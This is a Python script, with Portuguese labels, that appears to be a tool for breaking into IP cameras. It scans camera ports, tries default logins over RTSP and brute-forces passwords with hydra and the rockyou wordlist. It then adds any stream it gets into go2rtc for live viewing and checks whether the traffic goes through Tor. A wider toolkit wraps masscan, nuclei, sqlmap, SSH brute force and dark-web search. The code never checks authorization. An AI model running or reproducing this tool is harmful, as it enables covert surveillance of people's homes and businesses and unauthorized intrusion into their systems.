import subprocess, json, re
TOR="127.0.0.1:9050"; WORDLIST="/usr/share/wordlists/rockyou.txt"
CAM_PORTS=[554,8554,8080,8000,37779,80,443,34567]
def run(cmd, timeout=120):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"cmd":cmd,"out":r.stdout[-4000:],"err":r.stderr[-800:],"code":r.returncode}
    except Exception as e:
        return {"cmd":cmd,"err":str(e),"code":-1}
def tor_ok():
    return run(f"curl -s --socks5-hostname {TOR} http://check.torproject.org | grep -o Success", timeout=15)["out"].strip()=="Success"
def recon(t):
    p=",".join(map(str,CAM_PORTS)); r=run(f"nmap -Pn -sT -p {p} --open {t}",timeout=180)
    return {"target":t,"open_ports":[int(x) for x in re.findall(r"(\d+)/tcp\s+open",r["out"])],"raw":r["out"]}
def probe(t,port):
    rt=run(f"ffprobe -v error -rtsp_transport tcp -i rtsp://{t}:{port}/stream 2>&1 | head -1",timeout=15)
    return {"target":t,"port":int(port),"publica":(rt["code"]==0 and rt["err"]=="")}
def classify(t):
    rec=recon(t); cams=[probe(t,p) for p in rec["open_ports"]]
    return {"target":t,"cameras":cams,"publicas":[c for c in cams if c["publica"]],"privadas":[c for c in cams if not c["publica"]]}
CREDS=[("admin","admin"),("admin",""),("admin","12345"),("root","root")]
def pentest_camera(target, port=554):
    log=[]
    for u,p in CREDS:
        r=run(f"ffprobe -v error -rtsp_transport tcp -i rtsp://{u}:{p}@{target}:{port}/stream 2>&1 | head -1",timeout=12)
        if r["code"]==0 and r["err"]=="":
            log.append(f"acesso via {u}"); sn=f"beca_{target.replace(chr(46),chr(95))}_{port}"
            run(f"go2rtc add {sn}=rtsp://{u}:{p}@{target}:{port}/stream")
            return {"ok":True,"user":u,"pass":p,"hls_url":f"http://127.0.0.1:8554/{sn}.m3u8","anonymized":tor_ok(),"log":log}
    b=run(f"hydra -l admin -P {WORDLIST} -s 1 -t 4 rtsp://{target}:{port} 2>&1 | tail -20",timeout=600)
    m=re.search(r"Password:\s*(\S+)",b["out"])
    if m:
        log.append("acesso via brute_force"); pw=m.group(1); sn=f"beca_{target.replace(chr(46),chr(95))}_{port}"
        run(f"go2rtc add {sn}=rtsp://admin:{pw}@{target}:{port}/stream")
        return {"ok":True,"user":"admin","pass":pw,"hls_url":f"http://127.0.0.1:8554/{sn}.m3u8","anonymized":tor_ok(),"log":log}
    log.append("SEM ACESSO")
    return {"ok":False,"log":log,"manual":"identifique o modelo e aplique o CVE"}
TOOLKIT={"rede":{"scan_portas":lambda t:run(f"nmap -Pn -sV -sC --top-ports 1000 {t}"),"scan_rapido":lambda t:run(f"masscan {t} -p0-65535 --rate=3000")},
"web":{"tecnologias":lambda t:run(f"httpx -u {t} -tech-detect"),"vulns_web":lambda t:run(f"nuclei -u {t} -severity medium,high,critical"),"sql_injection":lambda t:run(f"sqlmap -u {t} --batch")},
"brute_force":{"ssh":lambda t,u:run(f"hydra -l {u} -P {WORDLIST} ssh://{t}"),"rtsp":lambda t,u,p:run(f"hydra -l {u} -P {WORDLIST} rtsp://{t}:{p}")},
"darkweb":{"busca_onion":lambda q:run(f"curl -s --socks5-hostname {TOR} https://dh.onion/search?q={q}"),"checar_tor":lambda:tor_ok()},
"osint":{"whois":lambda d:run(f"whois {d} | head -40"),"dns":lambda d:run(f"dig {d} +short")},
"stream":{"listar_streams":lambda:run("go2rtc api/streams")}}
def tool(c,n,*a): return TOOLKIT[c][n](*a)
